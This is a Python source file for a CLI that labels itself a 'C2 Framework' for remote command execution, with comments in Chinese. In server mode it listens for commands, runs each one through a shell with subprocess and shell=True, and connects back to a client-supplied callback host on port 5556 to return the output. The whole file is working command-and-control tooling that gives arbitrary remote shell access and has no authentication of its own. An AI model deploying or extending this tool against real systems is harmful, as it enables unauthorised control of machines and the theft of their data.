# cli/cli.py
import argparse
import time
import threading
import traceback
from typing import Optional

from core.comms import SecureComm, SecureCommConfig

# 常量
DEFAULT_CALLBACK_HOST = "c2_client"
SEND_RETRY_INTERVAL = 0.5
SEND_MAX_RETRIES = 40          # 最多重试 20s
RECEIVE_RETRY_INTERVAL = 0.5
RECEIVE_MAX_WAIT = 30         # 等待回调结果最多 30s


def send_with_retries(host: str, port: int, data: bytes, max_retries: int = SEND_MAX_RETRIES, wait: float = SEND_RETRY_INTERVAL):
    """使用 SecureComm 发送数据，遇到连接失败则重试"""
    last_exc = None
    for attempt in range(1, max_retries + 1):
        try:
            sc = SecureComm(host, port, is_server=False, config=SecureCommConfig(connect_timeout=2.0, io_timeout=10.0))
            sc.send_message(data)
            return
        except Exception as e:
            last_exc = e
            # 在可见日志中输出一次
            if attempt == 1 or attempt % 5 == 0 or attempt == max_retries:
                print(f"[send_with_retries] attempt {attempt}/{max_retries} failed to {host}:{port}: {e}")
            time.sleep(wait)
    # 全部失败后抛出最后的异常
    raise last_exc


def receive_once_with_retries(bind_host: str, bind_port: int, max_wait: float = RECEIVE_MAX_WAIT, wait: float = RECEIVE_RETRY_INTERVAL):
    """
    在本地启动一次性服务器等待单条消息（用重试循环处理 accept 超时）
    返回接收到的 bytes
    """
    start = time.time()
    while True:
        try:
            # 设置 accept_timeout 稍短，这样可以快速重试
            config = SecureCommConfig(accept_timeout=2.0, io_timeout=10.0)
            server = SecureComm(bind_host, bind_port, is_server=True, config=config)
            data = server.receive_message()
            return data
        except Exception as e:
            # 处理 accept 超时 / socket.timeout / ConnectionError 等
            # 如果等待时间超出阈值，抛出异常
            elapsed = time.time() - start
            if elapsed >= max_wait:
                print(f"[receive_once_with_retries] waited {elapsed:.1f}s >= {max_wait}s, raising. Last error: {e}")
                raise
            # 否则继续等待并重试
            # 只打印少量日志以防刷屏
            if isinstance(e, TimeoutError) or "timed out" in str(e):
                # 普通超时，继续重试
                time.sleep(wait)
                continue
            else:
                # 其它错误也做短暂等待然后重试
                print(f"[receive_once_with_retries] transient error: {e}; retrying...")
                time.sleep(wait)
                continue


# 启动客户端的函数
def run_client(host: str, port: int, command: str, callback_host: str = DEFAULT_CALLBACK_HOST):
    # 约定：payload = <command> + '|||CALLBACK_HOST=' + callback_host
    payload_str = f"{command}|||CALLBACK_HOST={callback_host}"
    payload = payload_str.encode("utf-8")

    print(f"Client: Sending command to {host}:{port} (callback_host={callback_host})")

    try:
        send_with_retries(host, port, payload)
        print("Client: Command sent!")
    except Exception as e:
        print(f"Client: Failed to send command to {host}:{port} -> {e}")
        traceback.print_exc()
        return

    # 在本容器的 5556 端口等待服务器回连返回结果
    try:
        result = receive_once_with_retries("0.0.0.0", 5556)
        print(f"Client: Command result: {result.decode(errors='replace')}")
    except Exception as e:
        print(f"Client: Failed to receive callback on 5556 -> {e}")
        traceback.print_exc()


# 启动服务器的函数
def run_server(host: str, port: int):
    """
    server 持续监听，接收到一条命令后执行并回连到客户端提供的 callback_host:5556。
    这里采用一个简单的循环：当 accept 超时／抛错时继续监听；只有遇到不可恢复的错误才退出。
    """
    print(f"Server: Waiting for command at {host}:{port}")
    config = SecureCommConfig(accept_timeout=2.0, io_timeout=20.0)

    while True:
        try:
            comm = SecureComm(host, port, is_server=True, config=config)
            raw = comm.receive_message()  # 会阻塞直到收到一条或抛异常（比如 TimeoutError）
        except TimeoutError:
            # 超时，继续循环等待新连接
            continue
        except Exception as e:
            # 其它错误：打印并继续（避免进程退出）
            print(f"Server: error while waiting for message: {e}")
            traceback.print_exc()
            time.sleep(0.5)
            continue

        if raw is None:
            continue

        try:
            text = raw.decode("utf-8", errors="replace")
        except Exception:
            text = str(raw)

        # 解析回调 host 的约定：命令 + '|||CALLBACK_HOST=' + host
        callback_host: Optional[str] = None
        command = text
        marker = "|||CALLBACK_HOST="
        if marker in text:
            # 兼顾 partition/rpartition
            before, sep, after = text.partition(marker)
            if sep:
                command = before
                callback_host = after.strip()

        print(f"Server: Received command: {command} (callback_host={callback_host})")

        # 执行命令
        try:
            result = execute_command(command)
            result_bytes = result
        except Exception as e:
            result_bytes = f"Error executing command: {e}".encode("utf-8")

        # 如果 client 提供了 callback_host，就回连发送结果
        if callback_host:
            try:
                print(f"Server: Sending result back to {callback_host}:5556")
                send_with_retries(callback_host, 5556, result_bytes)
            except Exception as e:
                print(f"Server: Failed to send result to {callback_host}:5556 -> {e}")
                traceback.print_exc()
        else:
            # 如果没有 callback_host，打印并跳过（避免用 0.0.0.0 去连接）
            print("Server: No callback_host provided by client; cannot send result back.")


# 执行命令的函数
def execute_command(command: str) -> bytes:
    """执行收到的命令并返回结果"""
    import subprocess
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result
    except subprocess.CalledProcessError as e:
        return e.output
    except Exception as e:
        return f"Exception running command: {e}".encode("utf-8")


# 设置 CLI 参数
def main():
    parser = argparse.ArgumentParser(description="C2 Framework CLI - Remote Command Execution")
    subparsers = parser.add_subparsers(dest="mode", help="Mode of operation (client or server)")

    # 客户端模式
    client_parser = subparsers.add_parser("client", help="Run the client")
    client_parser.add_argument("--host", type=str, required=True, help="Server IP address or hostname")
    client_parser.add_argument("--port", type=int, required=True, help="Server port")
    client_parser.add_argument("--command", type=str, required=True, help="Command to execute on the server")
    client_parser.add_argument("--callback-host", type=str, default=DEFAULT_CALLBACK_HOST,
                               help=f"Host (container name or IP) for server to callback to (default: {DEFAULT_CALLBACK_HOST})")

    # 服务器模式
    server_parser = subparsers.add_parser("server", help="Run the server")
    server_parser.add_argument("--host", type=str, required=True, help="Server IP address to bind")
    server_parser.add_argument("--port", type=int, required=True, help="Port to listen on")

    args = parser.parse_args()

    if args.mode == "client":
        run_client(args.host, args.port, args.command, callback_host=args.callback_host)
    elif args.mode == "server":
        run_server(args.host, args.port)
    else:
        print("Invalid mode. Please choose 'client' or 'server'.")
        parser.print_help()


if __name__ == "__main__":
    main()
